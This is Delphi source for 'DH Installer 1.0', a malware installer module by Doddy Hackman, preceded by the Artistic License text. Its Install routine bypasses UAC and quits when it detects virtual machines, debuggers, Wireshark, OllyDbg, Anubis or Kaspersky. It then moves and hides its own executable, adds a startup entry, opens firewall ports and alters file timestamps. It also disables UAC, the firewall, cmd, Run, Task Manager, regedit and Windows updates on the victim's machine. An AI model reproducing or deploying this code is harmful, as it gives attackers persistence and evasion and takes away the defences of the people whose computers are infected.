{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// Unit : DH Installer 1.0
// (C) Doddy Hackman 2016

unit DH_Installer;

interface

uses SysUtils, Windows, DH_Auxiliar_Tools,
  DH_Malware_Antis, DH_Malware_Disables;

type
  other_array_dh_installer = array of string;

  T_DH_Installer = class
  private
    function split(texto: String; delimitador: string)
      : other_array_dh_installer;
  public
    op_hide_files, op_use_startup, op_startup_name, op_use_special_path,
      op_use_this_path, op_use_uac_tricky, op_uac_tricky_continue_if_off,
      op_uac_tricky_exit_if_off, op_uac_load_hidden, op_use_this_datetime,
      creation_time, modified_time, last_access, special_path, path, folder,
      new_name, op_anti_virtual_pc, op_anti_virtual_box, op_anti_debug,
      op_anti_wireshark, op_anti_ollydbg, op_anti_anubis, op_anti_kaspersky,
      op_anti_vmware, op_disable_uac, op_disable_firewall, op_disable_cmd,
      op_disable_run, op_disable_taskmgr, op_disable_regedit,
      op_disable_updates, op_disable_msconfig, op_open_firewall_port,
      op_open_firewall_port_name, op_open_firewall_port_number: string;
    constructor Create;
    destructor Destroy; override;
    procedure set_UAC_Tricky(op_use_uac_tricky_value,
      op_uac_tricky_continue_if_off_value, op_uac_tricky_exit_if_off_value,
      op_uac_load_hidden_value: string);
    procedure setAntis(op_anti_virtual_pc_value, op_anti_virtual_box_value,
      op_anti_debug_value, op_anti_wireshark_value, op_anti_ollydbg_value,
      op_anti_anubis_value, op_anti_kaspersky_value,
      op_anti_vmware_value: string);
    procedure setDisables(op_disable_uac_value, op_disable_firewall_value,
      op_disable_cmd_value, op_disable_run_value, op_disable_taskmgr_value,
      op_disable_regedit_value, op_disable_updates_value,
      op_disable_msconfig_value: string);
    procedure setMoveFile(op_use_special_path_value, op_use_this_path_value,
      special_path_value, path_value, folder_value, new_name_value: string);
    procedure setHide(op_hide_files_value: string);
    procedure setStartup(op_use_startup_value, op_startup_name_value: string);
    procedure setDateTime(op_use_this_datetime_value, creation_time_value,
      modified_time_value, last_access_value: string);
    procedure setOpenFirewallPort(op_open_firewall_port_value,
      op_open_firewall_port_name_value,
      op_open_firewall_port_number_value: string);
    function Install(): string;
  end;

implementation

constructor T_DH_Installer.Create;
begin
  inherited Create;

  op_hide_files := '';
  op_use_startup := '';

  op_use_special_path := '';
  op_use_this_path := '';
  special_path := '';
  path := '';
  folder := '';

  op_use_uac_tricky := '';
  op_uac_tricky_continue_if_off := '';
  op_uac_tricky_exit_if_off := '';
  op_uac_load_hidden := '';

  op_use_this_datetime := '';
  creation_time := '';
  modified_time := '';
  last_access := '';

  op_open_firewall_port := '';
  op_open_firewall_port_name := '';
  op_open_firewall_port_number := '';

  op_anti_virtual_pc := '';
  op_anti_virtual_box := '';
  op_anti_debug := '';
  op_anti_wireshark := '';
  op_anti_ollydbg := '';
  op_anti_anubis := '';
  op_anti_kaspersky := '';
  op_anti_vmware := '';

  op_disable_uac := '';
  op_disable_firewall := '';
  op_disable_cmd := '';
  op_disable_run := '';
  op_disable_taskmgr := '';
  op_disable_regedit := '';
  op_disable_updates := '';
  op_disable_msconfig := '';

end;

destructor T_DH_Installer.Destroy;
begin
  inherited Destroy;
end;

// Functions

function T_DH_Installer.split(texto: String; delimitador: string)
  : other_array_dh_installer;
var
  array_ready: other_array_dh_installer;
  check1: integer;
  check2: integer;
begin
  if not(texto = '') and not(delimitador = '') then
  begin
    check1 := 0;
    check2 := 0;
    SetLength(array_ready, 1);
    array_ready[0] := '';

    for check1 := 1 to Length(texto) do
    begin
      if texto[check1] = delimitador then
      begin
        check2 := check2 + 1;
        SetLength(array_ready, Length(array_ready) + 1);
      end
      else
      begin
        array_ready[check2] := array_ready[check2] + texto[check1];
      end;
    end;
    if (Length(array_ready) > 1) then
    begin
      Result := array_ready;
    end;
  end
  else
  begin
    Result := array_ready;
  end;
end;

procedure T_DH_Installer.set_UAC_Tricky(op_use_uac_tricky_value,
  op_uac_tricky_continue_if_off_value, op_uac_tricky_exit_if_off_value,
  op_uac_load_hidden_value: string);
begin
  op_use_uac_tricky := op_use_uac_tricky_value;
  op_uac_tricky_continue_if_off := op_uac_tricky_continue_if_off_value;
  op_uac_tricky_exit_if_off := op_uac_tricky_exit_if_off_value;
  op_uac_load_hidden := op_uac_load_hidden_value;
end;

procedure T_DH_Installer.setAntis(op_anti_virtual_pc_value,
  op_anti_virtual_box_value, op_anti_debug_value, op_anti_wireshark_value,
  op_anti_ollydbg_value, op_anti_anubis_value, op_anti_kaspersky_value,
  op_anti_vmware_value: string);
begin
  op_anti_virtual_pc := op_anti_virtual_pc_value;
  op_anti_virtual_box := op_anti_virtual_box_value;
  op_anti_debug := op_anti_debug_value;
  op_anti_wireshark := op_anti_wireshark_value;
  op_anti_ollydbg := op_anti_ollydbg_value;
  op_anti_anubis := op_anti_anubis_value;
  op_anti_kaspersky := op_anti_kaspersky_value;
  op_anti_vmware := op_anti_vmware_value;
end;

procedure T_DH_Installer.setDisables(op_disable_uac_value,
  op_disable_firewall_value, op_disable_cmd_value, op_disable_run_value,
  op_disable_taskmgr_value, op_disable_regedit_value, op_disable_updates_value,
  op_disable_msconfig_value: string);
begin
  op_disable_uac := op_disable_uac_value;
  op_disable_firewall := op_disable_firewall_value;
  op_disable_cmd := op_disable_cmd_value;
  op_disable_run := op_disable_run_value;
  op_disable_taskmgr := op_disable_taskmgr_value;
  op_disable_regedit := op_disable_regedit_value;
  op_disable_updates := op_disable_updates_value;
  op_disable_msconfig := op_disable_msconfig_value;
end;

procedure T_DH_Installer.setMoveFile(op_use_special_path_value,
  op_use_this_path_value, special_path_value, path_value, folder_value,
  new_name_value: string);
begin
  op_use_special_path := op_use_special_path_value;
  op_use_this_path := op_use_this_path_value;
  special_path := special_path_value;
  path := path_value;
  folder := folder_value;
  new_name := new_name_value;
end;

procedure T_DH_Installer.setHide(op_hide_files_value: string);
begin
  op_hide_files := op_hide_files_value;
end;

procedure T_DH_Installer.setStartup(op_use_startup_value,
  op_startup_name_value: string);
begin
  op_use_startup := op_use_startup_value;
  op_startup_name := op_startup_name_value;
end;

procedure T_DH_Installer.setDateTime(op_use_this_datetime_value,
  creation_time_value, modified_time_value, last_access_value: string);
begin
  op_use_this_datetime := op_use_this_datetime_value;
  creation_time := creation_time_value;
  modified_time := modified_time_value;
  last_access := last_access_value;
end;

procedure T_DH_Installer.setOpenFirewallPort(op_open_firewall_port_value,
  op_open_firewall_port_name_value, op_open_firewall_port_number_value: string);
begin
  op_open_firewall_port := op_open_firewall_port_value;
  op_open_firewall_port_name := op_open_firewall_port_name + '-' +
    op_open_firewall_port_name_value;
  op_open_firewall_port_number := op_open_firewall_port_number + '-' +
    op_open_firewall_port_number_value;
end;

function T_DH_Installer.Install(): string;
var
  logs: string;
var
  i: integer;
  array_firewall_ports_names: other_array_dh_installer;
  array_firewall_ports_numbers: other_array_dh_installer;
  firewall_port_name, firewall_port_number: string;
var
  auxiliar_tools: T_DH_Auxiliar_Tools;
  antis_tools: T_DH_Malware_Antis;
  disables_tools: T_DH_Malware_Disables;
var
  dir, dir_hide, real_path: string;
begin

  logs := '';

  auxiliar_tools := T_DH_Auxiliar_Tools.Create();
  antis_tools := T_DH_Malware_Antis.Create();
  disables_tools := T_DH_Malware_Disables.Create();

  // Uac Trick

  if (op_use_uac_tricky = '1') then
  begin
    if not(auxiliar_tools.check_admin_status()) then
    begin
      if (auxiliar_tools.check_uac_status()) then
      begin
        logs := logs + 'UAC Tricked Working' + sLineBreak;
        if (auxiliar_tools.uac_trick(paramstr(0), op_uac_load_hidden)) then
        begin
          logs := logs + 'UAC Trick Complete' + sLineBreak;
          ExitProcess(0);
        end
        else
        begin
          if (op_uac_tricky_exit_if_off = '1') then
          begin
            logs := logs + 'UAC Trick FAILED , Closing ...' + sLineBreak;
            ExitProcess(0);
          end;
        end;
      end;
    end
    else
    begin
      logs := logs + 'UAC Tricked' + sLineBreak;
    end;
  end;

  // Antis

  if (op_anti_virtual_pc = '1') then
  begin
    if (antis_tools.check_antis('virtual_pc')) then
    begin
      logs := logs + 'Virtual PC detected' + sLineBreak;
      ExitProcess(0);
    end
    else
    begin
      logs := logs + 'Virtual PC not detected' + sLineBreak;
    end;
  end;

  if (op_anti_virtual_box = '1') then
  begin
    if (antis_tools.check_antis('virtual_box')) then
    begin
      logs := logs + 'Virtual Box detected' + sLineBreak;
      ExitProcess(0);
    end
    else
    begin
      logs := logs + 'Virtual Box not detected' + sLineBreak;
    end;
  end;

  if (op_anti_debug = '1') then
  begin
    if (antis_tools.check_debug()) then
    begin
      logs := logs + 'Debug detected' + sLineBreak;
      ExitProcess(0);
    end
    else
    begin
      logs := logs + 'Debug not detected' + sLineBreak;
    end;
  end;

  if (op_anti_wireshark = '1') then
  begin
    if (antis_tools.check_wireshark()) then
    begin
      logs := logs + 'Wireshark detected' + sLineBreak;
      ExitProcess(0);
    end
    else
    begin
      logs := logs + 'Wireshark not detected' + sLineBreak;
    end;
  end;

  if (op_anti_ollydbg = '1') then
  begin
    if (antis_tools.check_ollydbg()) then
    begin
      logs := logs + 'Ollydbg detected' + sLineBreak;
      ExitProcess(0);
    end
    else
    begin
      logs := logs + 'Ollydbg not detected' + sLineBreak;
    end;
  end;

  if (op_anti_anubis = '1') then
  begin
    if (antis_tools.check_antis('anubis')) then
    begin
      logs := logs + 'Anubis detected' + sLineBreak;
      ExitProcess(0);
    end
    else
    begin
      logs := logs + 'Anubis not detected' + sLineBreak;
    end;
  end;

  if (op_anti_kaspersky = '1') then
  begin
    if (antis_tools.check_kaspersky()) then
    begin
      logs := logs + 'Kaspersky detected' + sLineBreak;
      ExitProcess(0);
    end
    else
    begin
      logs := logs + 'Kaspersky not detected' + sLineBreak;
    end;
  end;

  if (op_anti_vmware = '1') then
  begin
    if (antis_tools.check_antis('vmware')) then
    begin
      logs := logs + 'Vmware detected' + sLineBreak;
      ExitProcess(0);
    end
    else
    begin
      logs := logs + 'Vmware not detected' + sLineBreak;
    end;
  end;

  // Move Files

  if (op_use_this_path = '1') or (op_use_special_path = '1') then
  begin

    if (op_use_this_path = '1') then
    begin
      dir_hide := path;
    end;
    if (op_use_special_path = '1') then
    begin
      dir_hide := GetEnvironmentVariable(special_path) + '\';
    end;

    dir := dir_hide + folder + '\';

    if not(DirectoryExists(dir)) then
    begin
      CreateDir(dir);
    end;

    ChDir(dir);

    real_path := dir + new_name;

    if not(paramstr(0) = real_path) then
    begin
      if (FileExists(real_path)) then
      begin
        DeleteFile(Pchar(real_path));
      end;
    end;

    if (MoveFile(Pchar(paramstr(0)), Pchar(real_path))) then
    begin
      logs := logs + 'File Moved to : ' + real_path + sLineBreak;
    end
    else
    begin
      logs := logs + 'Error File Moving to : ' + real_path + sLineBreak;
    end;

  end;

  // Hide Files

  if (op_hide_files = '1') then
  begin
    if (auxiliar_tools.hide_file(dir)) then
    begin
      logs := logs + 'Directory ' + dir + ' Hidden' + sLineBreak;
    end
    else
    begin
      logs := logs + 'Error hidding directory ' + dir + sLineBreak;
    end;
    if (auxiliar_tools.hide_file(real_path)) then
    begin
      logs := logs + 'File ' + real_path + ' Hidden' + sLineBreak;
    end
    else
    begin
      logs := logs + 'Error hidding file ' + real_path + sLineBreak;
    end;
  end;

  // Startup File

  if (op_use_startup = '1') then
  begin
    if (auxiliar_tools.add_startup(op_startup_name, real_path)) then
    begin
      logs := logs + 'Startup Ready' + sLineBreak;
    end
    else
    begin
      logs := logs + 'Startup Failed' + sLineBreak;
    end;
  end;

  // Open Firewall Port

  if (op_open_firewall_port = '1') then
  begin
    array_firewall_ports_names := split(op_open_firewall_port_name, '-');
    array_firewall_ports_numbers := split(op_open_firewall_port_number, '-');

    // logs := logs + 'Array Name : ' + op_open_firewall_port_name + sLineBreak;
    // logs := logs + 'Array Port : ' + op_open_firewall_port_number + sLineBreak;

    For i := Low(array_firewall_ports_names)
      to High(array_firewall_ports_names) do
    begin
      firewall_port_name := array_firewall_ports_names[i];
      firewall_port_number := array_firewall_ports_numbers[i];
      // logs := logs + 'Name : ' + firewall_port_name + sLineBreak;
      // logs := logs + 'Number : ' + firewall_port_number + sLineBreak;
      if not(firewall_port_name = '') and not(firewall_port_number = '') then
      begin
        if (auxiliar_tools.open_port_in_firewall(firewall_port_name, real_path,
          StrToInt(firewall_port_number))) then
        begin
          logs := logs + 'Port ' + firewall_port_number + ' open as ' +
            firewall_port_name + sLineBreak;
        end
        else
        begin
          logs := logs + 'Failed open port ' + firewall_port_number + ' as ' +
            firewall_port_name + sLineBreak;
        end;
      end;
    end;
  end;

  // Set Date

  if (op_use_this_datetime = '1') then
  begin
    if (auxiliar_tools.change_datetime_file(real_path, 'created', creation_time))
    then
    begin
      logs := logs + 'Creation time changed' + sLineBreak;
    end
    else
    begin
      logs := logs + 'Creation time not changed' + sLineBreak;
    end;
    if (auxiliar_tools.change_datetime_file(real_path, 'modified',
      modified_time)) then
    begin
      logs := logs + 'Modified time changed' + sLineBreak;
    end
    else
    begin
      logs := logs + 'Modified time not changed' + sLineBreak;
    end;
  end;

  // Disables

  if (op_disable_uac = '1') then
  begin
    if (disables_tools.uac_manager('off')) then
    begin
      logs := logs + 'UAC disabled' + sLineBreak;
    end
    else
    begin
      logs := logs + 'UAC not disabled' + sLineBreak;
    end;
  end;

  if (op_disable_firewall = '1') then
  begin
    if (disables_tools.firewall_manager('seven', 'off')) then
    begin
      logs := logs + 'Firewall disabled' + sLineBreak;
    end
    else
    begin
      logs := logs + 'Firewall not disabled' + sLineBreak;
    end;
  end;

  if (op_disable_cmd = '1') then
  begin
    if (disables_tools.cmd_manager('off')) then
    begin
      logs := logs + 'CMD disable' + sLineBreak;
    end
    else
    begin
      logs := logs + 'CMD not disable' + sLineBreak;
    end;
  end;

  if (op_disable_run = '1') then
  begin
    if (disables_tools.run_manager('off')) then
    begin
      logs := logs + 'Run Manager disabled' + sLineBreak;
    end
    else
    begin
      logs := logs + 'Run Manager not disabled' + sLineBreak;
    end;
  end;

  if (op_disable_taskmgr = '1') then
  begin
    if (disables_tools.taskmgr_manager('off')) then
    begin
      logs := logs + 'Taskmgr disabled' + sLineBreak;
    end
    else
    begin
      logs := logs + 'Taskmgr not disabled' + sLineBreak;
    end;
  end;

  if (op_disable_regedit = '1') then
  begin
    if (disables_tools.regedit_manager('off')) then
    begin
      logs := logs + 'Regedir disabled' + sLineBreak;
    end
    else
    begin
      logs := logs + 'Regedit not disabled' + sLineBreak;
    end;
  end;

  if (op_disable_updates = '1') then
  begin
    if (disables_tools.updates_manager('off')) then
    begin
      logs := logs + 'Updates disabled' + sLineBreak;
    end
    else
    begin
      logs := logs + 'Updates not disabled' + sLineBreak;
    end;
  end;

  //

  auxiliar_tools.Free();
  antis_tools.Free();
  disables_tools.Free();

  Result := logs;

end;

end.

// The End ?
